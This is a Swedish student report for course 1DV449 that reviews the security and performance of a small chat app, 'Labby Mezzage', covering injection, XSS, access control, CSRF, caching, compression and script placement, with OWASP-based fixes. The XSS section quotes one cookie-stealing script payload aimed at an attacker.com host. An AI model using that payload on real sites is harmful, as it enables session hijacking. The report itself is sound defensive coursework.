# Labby Mezzage
### Säkerhetsbrister 
* [Injections](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#injections)
* [Cross-Site Scripting (XSS)](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#cross-site-scripting-xss),
* [Avsaknad av funktionella nivåer med åtkomstkontroll](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#avsaknad-av-funktionella-nivåer-med-åtkomstkontroll)
* [Cross-Site Request Forgery (CSRF)](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#cross-site-request-forgery-csrf)  

### Prestandaproblem 
* [HTTP Cache-Headers](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#http-cache-headers)
* [Komprimering av statiska filer](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#komprimering-av-statiska-filer)
* [Inlänkning](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#inlänkning)
* [Inline](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#inline)
* [Egna övergripande reflektioner](https://github.com/jc222fi/1DV449_jc222fi/blob/master/LabbyMezzage.md#egna-övergripande-reflektioner)

### Potentiella säkerhetsbrister och prestandaproblem
Skriven av Johanna Larsson Cornejo (jc222fi) för kursen 1DV449 - Webbteknik II

## Potentiella brister gällande säkerheten
Vid en första anblick ser applikationen ut att utföra den uppgift den är avsedd för bra, men vid en närmre titt kan en del säkerhetsbrister konstateras. Effekterna av en säkerhetsbrist beror alltid på vart bristen ligger och vilken information som läcker ut till följd av den bristande säkerheten. Vi ska i den här rapporten titta närmare på de olika säkerhetsbristerna som funnits en efter en.

### Injections
Otillräckligt skydd eller helt avsaknad av skydd mot injections i exempelvis ett inloggningsformulär är ett stort problem i många av dagens webbapplikationer, och Labby Mezzage är inget undantag. Problemet med injections är att applikationen vid en attack ger åtkomst till databasen till en attackerare som inte ska ha någon åtkomst alls, och är med som första punkt på OWASPs lista från 2013 på de vanligaste säkerhetsbristerna i webbapplikationer [1]. Detta ger en chans till manipulering av data eller helt enkelt exponering av känslig data. För att förhindra attacker med injections rekommenderar OWASP att man använder lagrade procedurer med parametrar [2], och aldrig ge direkt åtkomst till databasen genom konkatenering av strängar där det som användaren skriver in i lösenordsfältet läggs direkt in i SQL-satsen. Om webbramverk används, som i det här fallet är Ajax, är det viktigt att det är den senaste versionen som används för att säkerställa att ramverket är uppdaterat och eventuella säkerhetsbrister som upptäckts har blivit åtgärdade. De rekommenderar även att man använder ESAPI database encoders i de fall det är implementerbart [2].

### Cross-Site Scripting (XSS)
Cross-Site Scripting, ofta förkortat till XSS, är med som nummer 3 på 2013 års lista över de vanligaste och mest vidspridda säkerhetsbristerna enligt OWASP [1]. Efter ett försök att skicka en textsträng istället för ett normalt utformat meddelande har påvisat att denna applikation är sårbar för dessa attacker. Då validering mot HTML-taggar saknas är det inga problem att skicka textsträngen ” `><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>`'”, som sedan agerar precis som ett script och skickar vidare information om användarens session till den destination som specificerats i scriptet. För att förebygga denna typ av attack bör en validering med hjälp av en ”whitelist” användas för all input från formulär, även om detta inte är tillräckligt för att helt förhindra dessa attacker. Valideringen bör ske i flera steg, och applikationen bör utformas på ett sätt så att ingen input från användaren resulterar i att HTML-kod kan anges direkt i textfältet och skickas med anropet. Exempelvis kan ESAPI referensimplementation användas för att HTML-kodning ska ske på eventuella försök att skicka med HTML-taggar med anropet [3].

### Avsaknad av funktionella nivåer med åtkomstkontroll
Genom att manuellt ändra URLen direkt i adressfältet kan man testa om åtkomstkontroll till olika priviligierade funktioner är korrekt implementerat. Denna säkerhetsrisk är med som nummer 7 på OWASPs lista från 2013 [1]. Ett specifikt önskemål från kundens sida är att ingen utomstående ska ha åtkomst till innehållet, utan korrekt inloggning ska man inte kunna se något innehåll. Detta krav är inte tillgodosett i dagsläget, genom att på startsidan manuellt ändra URLen och lägga till /message kan en utomstående obehindrat se alla meddelanden som skickats. Inga nya meddelanden kan skickas, men informationen är inte så skyddad som startsidan med inloggningsformulär kan antyda. Lägger du dessutom till /data efter /message exponeras hela strukturen av JSON-objektet som innehåller all data angående alla meddelanden, inklusive id som är primärnyckel i databasen. Har man som obehörig användare tillgång till primärnyckeln kan man även genom eventuella andra säkerhetsbrister ändra och manipulera dessa poster. För att förhindra dessa typer av attacker bör man ha en auktoriseringsmodul som verifierar att användaren är behörig till den funktion som den försöker använda. En säkerhetskontroll bör vara implementerad på ett sådant sätt att en användare som utgångspunkt är nekad åtkomst, om inte kriterierna för åtkomst uppfylls. OWASP har ett dokument med en guide för hur man testar sin applikation för denna typ av attacker, eftersom det är osannolikt att automatiska tester identifierar denna typ av säkerhetsbrister [4].

### Cross-Site Request Forgery (CSRF)
Vid otillbörligt skydd mot CSRF kan en attackerare skicka requests med beteenden som inte var tanken. Exempelvis kan attackeraren lägga in en img-tagg och bädda in det önskade beteendet, som kan vara en transaktion från ett konto till ett annat, via en sida som attackeraren kontrollerar. I fallet med Labby Mezzage innebär det att en obehörig användare kan skapa och radera meddelanden, förslagsvis med javascript, om en användare är inloggad i applikationen. Denna säkerhetsbrist är listad som nummer 8 på OWASPs lista från 2013 [1]. För att skydda sig mot den här typen av attacker kan man inkludera en unik token, även kallat Synchronizer Token Pattern, som skickas med din HTTP-request. Dessa tokens borde som minimum var unika för varje användarsession. OWASP har även utvecklat ett bibliotek för att skydda sig mot dessa attacker, som implementerar en variant av Synchronizer Token Pattern [5]. Man kan även som användare ta en del steg till att försvåra för den här typen av attacker, några av dessa är att aldrig låta en webbläsare komma ihåg din inloggning, att alltid logga ut direkt efter att du använt en webbapplikation, eller helt enkelt stänga av JavaScript direkt i webbläsaren [6].

## Prestandaproblem
Då applikationen är förhållandevis liten märker man inte av de misstag som gjorts gällande prestandan på samma sätt som man skulle gjort på en större applikation eller webbsida.

### HTTP Cache-Headers
För att spara tid vid återkommande besök på en webbsida används cachen för att spara data tillfälligt över en tidsperiod och på så sätt hämta det cachade datat lokalt istället för att hämta det på servern. Man kan som utvecklare ge olika förhållningsregler till cachen genom HTTP Cache-Headers, där du kan specificera vad som ska sparas i cachen och hur länge, samt vad som gäller vid hämtning via en proxyserver [7]. När man inspekterar response headern för applikationen finner man att inga filer sparas i cachen, utan allt hämtas varje gång från servern och ger därför sämre prestanda vid återkommande besök. Expires-headern är i dagsläget satt till -1 vilket resulterar i att inget sparas. Eftersom applikationen ska fungera som en intern todo-lista är chansen för frekventa återkommande besök hög, och skulle därför kunna dra nytta av att implementera en strategi för cachening, inledningsvis kan man börja med att ändra Expires-headern till ett utgångsdatum i framtiden, gärna i kombination med en Cache-Control: max-age [7]. Hur långt i framtiden den ska sättas till bör diskuteras med klienten för att utröna hur tidskänslig todo-listan är.

### Komprimering av statiska filer
Ännu ett sätt att spara tid på resurser som laddas in är att komprimera de resurser som är statiska. Alla textfiler större än 1 Kb är lämpliga att komprimera eftersom dessa inte är komprimerade från början, till skillnad från exempelvis bildfiler. Eftersom komprimering kostar i CPU cykler både på servern vid komprimeringen och i klienten vid dekompressionen brukar man sätta en tumregel att inga filer som är mindre än 1 eller 2 Kb bör komprimeras [8]. För applikationen innebär detta att alla filer i mappen ”static” är lämpliga att komprimera eftersom ingen understiger storleken 1 Kb, men i nuläget komprimeras inga filer alls. Detta kan lösas genom att lägga till headern Content-Encoding: gzip och eventuellt även deflate. Dessa två är de vanligaste sätten att komprimera filer, och gzip är den mest effektiva komprimeringsmetoden just nu [8].

##CSS och JavaScript implementerat på fel ställen

### Inlänkning
All CSS-kod för en webbsida bör skrivas i ett eller flera separata dokument för att sedan länkas in i taggen <head> i början av ett HTML-dokument. För att som utvecklare lättare kunna underhålla koden, samt för att koden ger olika beteenden i webbläsaren beroende på vart den läggs. Om man följer standarden att länka in ett dokument med CSS-kod, men lagt den i slutet av HTML-dokumentet istället för i början kan webbläsaren upplevas som sämre eftersom webbläsaren kan vänta med att visa elementen på sidan tills alla resurser lästs in. Detta kan vara olika beroende på vilken webbläsare som används, men i värsta fall kan webbläsaren välja att vänta med att rendera alla element på sidan tills all CSS-kod lästs in, eftersom den vill undvika ”Flash of Unstyled Content”, där element till en början visas utan sin design och eventuella bilder för att fixas till när webbläsaren väl kommer ner till den del av koden där CSS-koden laddas in [9]. JavaScript ska istället länkas in i slutet av HTML-dokumentet, eftersom sidan annars slutar att renderas till dess att webbläsaren är färdig med att läsa in scriptet. Skulle man länka in ett script i mitten på en webbapplikation skulle det verka som att webbläsaren hängt sig eller att anslutningen brutits eftersom den inte gör några synliga framsteg för användaren förrän scriptet har laddat färdigt helt [10]. För att optimera applikationen bör detta åtgärdas för Labby Mezzage, då det finns script som laddas in redan i <head>-taggen och på så vis sinkar inläsningen av applikationen till webbläsaren.

### Inline
Utöver att CSS-resurser och script länkas in på fel ställe hittas även en del inline-kod, vilket betyder att det kodats rakt in i HTML-dokumentet. Detta kan ge ett oväntat utseende vad gäller design, eftersom CSS-regler har olika vikt beroende på om den är skriven inline eller länkats in från ett separat dokument. Har du som utvecklare lagt CSS-kod som attribut på ett HTML-element skriver detta attribut över regler som återfinns i den separata CSS-resursen eftersom det har högre prioritet enligt webbläsaren. Har du lagt CSS-kod i en `<style>`tagg skriver denna kod också över en extern resurs [11]. Detsamma gäller alla script, men här har vi också problemet att progressiv rendering av applikationen pausas när webbläsaren hittar en `<script>`-tagg och fortsätter för efter det att scriptet lästs in i sin helhet. För användaren kan detta upplevas som att uppkopplingen slutat fungera, eller att något annat är fel med applikationen. Av den anledningen bör all form av inline-kod undvikas och inte användas alls [12]. I Labby Mezzage används både JavaScript-kod och CSS-kod som icke externa resurser, vilket givetvis påverkar prestandan. All kod bör ligga som externa resurser och länkas in, och JavaScript-resurserna bör därtill minifieras [13].

## Egna övergripande reflektioner

Personligen tycker jag att säkerhet är en viktig del av alla applikationer, och lägger så mycket tid som jag hinner med på att inte ha några vidöppna säkerhetsbrister. I den här applikationen verkar det inte ha lagts speciellt mycket energi på säkerheten då de flesta i branschen är medvetna om de största säkerhetsbristerna som uppenbarligen finns i den koden. Då applikationen är förhållandevis liten och inte avsedd att hantera en massa känsliga data är det inte hela världen att den inte täppt igen vartenda säkerhetshål i boken, men de säkerhetsbrister som jag har påtalat i denna rapport känns alldeles för genomskinliga för att släppas igenom. På sina håll har det inte ens gjorts ett försök att förhindra intrång, vilket påvisar en nonchalans för kundens intressen.

Vad gäller optimering av prestandan har här gjorts en del riktiga nybörjarmisstag, att inline-styles var en dålig idé fick vi lära oss redan i den första kursen. Att länka in script i slutet och CSS i `<head>` var också bland det första vi lärde oss, men ändå har båda dessa misstag gjorts i denna applikation.

# Referenser
* [1] 	Open Web Application Security Project, ”OWASP Top 10 - 2013,” _OWASP_, 12 Juni 2013. [Online]. Available: [https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013](https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013). [Hämtad: 3 December 2015].
* [2] 	Open Web Application Security Project, ”SQL Injection Prevention Cheat Sheet,” _OWASP_, 5 11 2015. [Online]. Available: [https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet). [Hämtad: 6 December 2015].
* [3] 	Open Web Application Security Project, ”XSS (Cross Site Scripting) Prevention Cheat Sheet,” _OWASP_, 1 December 2015. [Online]. Available:[https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet). [Hämtad: 3 December 2015].
* [4] 	Open Web Application Security Project, ”Testing Directory traversal/file include (OTG-AUTHZ-001),” _OWASP_, 28 April 2015. [Online]. Available:[https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)](https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)). [Hämtad: 7 December 2015].
* [5] 	Open Web Application Security Project, ”Category:OWASP CSRFGuard Project,” _OWASP_, 24 November 2015. [Online]. Available: [https://www.owasp.org/index.php/CSRFGuard](https://www.owasp.org/index.php/CSRFGuard). [Hämtad: 7 December 2015].
* [6] 	Open Web Application Security Project, ”Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet,” _OWASP_, 5 November 2015. [Online]. Available: [https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet). [Hämtad: 7 December 2015].
* [7]   S. Souders, ”Rule 3: Add an Expires Header,” i High Performance Web Sites, O'Reilly Media, 2007, pp. 22-28.
* [8]   S. Souders, ”Rule 4: Gzip Components,” i High Performance Web Sites, O'Reilly Media, 2007, pp. 29-36.
* [9] 	S. Souders, ”Rule 5: Put Stylesheets at the Top5,” i _High Performance Web Sites_, O'Reilly Media, 2007, pp. 37-44.
* [10] 	S. Souders, ”Rule 6: Put Scripts at the Bottom6,” i _High Performance Web Sites_, O'Reilly Media, 2007, pp. 45-50.
* [11] 	W3C, ”w3schools.com,” _Refsnes Data_, [Online]. Available: [http://www.w3schools.com/tags/att_global_style.asp](http://www.w3schools.com/tags/att_global_style.asp). [Hämtad: 7 December 2015].
* [12] 	S. Souders, ”Rule 8: Make JavaScript and CSS External8,” i _High Performance Web Sites_, O'Reilly Media, 2007, pp. 55-62.
* [13] 	S. Souders, ”Rule 10: Minify JavaScript,” i _High Performance Web Sites_, O'Reilly Media, 2007, pp. 69-75.
